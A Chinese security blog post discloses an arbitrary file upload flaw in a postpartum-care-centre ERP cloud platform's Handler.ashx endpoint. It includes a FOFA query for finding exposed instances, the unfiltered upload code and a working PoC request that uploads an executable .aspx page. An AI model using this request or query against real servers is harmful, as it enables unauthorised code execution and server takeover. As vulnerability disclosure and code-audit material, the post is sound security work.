---
title: "月子会所ERP管理云平台 Page/ContractManager/ashx/Handler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-ContractManager-rce.html
asset_dir: assets/月子会所erp管理云平台-pagecontractmanagerashxhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 Page/ContractManager/ashx/Handler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/2 08:29
- 574浏览
- [0评论](#comment)
- 32分钟阅读

深入探索

ERP

Server

MapPath

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理[软件](#)。月子会所ERP管理云平台的 Page/ContractManager/ashx/Handler.ashx 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，由于未对上传文件进行任何过滤，攻击者可利用该漏洞上传恶意文件，进而获取服务器控制权。

企业资源规划

# fofa语法

> body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"

# 漏洞分析

```
public class Handler : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        HttpFileCollection flist = context.Request.Files;
        string UploadfileURLList = "";
        if (context.Request.Files.Count > 0)
        {
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];
                //if (mypost.ContentLength > 0)
                //{

                string picneme = mypost.FileName;
                string tuozhanming = picneme.Substring(picneme.LastIndexOf(".")).ToLower();     //拓展名
                string oldName = picneme.Substring(0, picneme.LastIndexOf("."));
                //if (tuozhanming == ".xlsx" || tuozhanming == ".docx" || tuozhanming == ".doc" || tuozhanming == ".xls")
                //{
                string newname = GetNewName(oldName, tuozhanming);
                UploadfileURLList += newname + "|";
                string url = System.Configuration.ConfigurationManager.AppSettings["UPLOAD_CONTACT_URL"].ToString();
                var uploadFileName = HttpContext.Current.Server.MapPath(url);
                if (!Directory.Exists(uploadFileName))
                {
                    Directory.CreateDirectory(uploadFileName);
                }

                //../../UploadBaseFolder/Contact/
                mypost.SaveAs(context.Server.MapPath("../" + url + newname));
                //mypost.SaveAs(context.Server.MapPath("../../../UploadfileURL/" + newname));
                System.Threading.Thread.Sleep(100);
                //}
                //}

            }
            UploadfileURLList = UploadfileURLList.Substring(0, UploadfileURLList.Length - 1);
        }
        context.Response.Write(UploadfileURLList);

    }

    public string GetNewName(string oldName, string tuozhanming)
    {
        string time = DateTime.Now.ToString("yyMMddHHmmss");
        //string newname = time.Replace("-", "").Replace(" ", "").Replace(":", "").Replace("年", "").Replace("月", "").Replace("日", "").Replace("/", "");
        return oldName + "_" + time + new Random().Next(0000000, 9999999) + tuozhanming;

    }
```

直接上传对文件类型无任何过滤或校验，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

UPLOAD\_CONTACT\_URL 位置在 web.config 设置，一般为

云存储

```
<add key="UPLOAD_CONTACT_URL" value="../../UploadBaseFolder/Contact/" />
```

所以最终上传文件保存路径为 /UploadBaseFolder/Contact/文件名

# 漏洞复现

## POC

```
POST /Page/ContractManager/ashx/Handler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123

------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="test.aspx"

<%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
------WebKitFormBoundary123--
```

访问上传文件 UploadBaseFolder/Contact/响应文件名

漏洞预警服务

[![月子会所ERP管理云平台 Page/ContractManager/ashx/Handler.ashx 任意文件上传漏洞](images/img-001-27f15b594bab.webp)](https://image.mrxn.net/c9ef0f2991d54c659999c0043989093a.webp)

成功打印随机GUID字符串并删除自身。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [4.1.POC](#toc-4-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
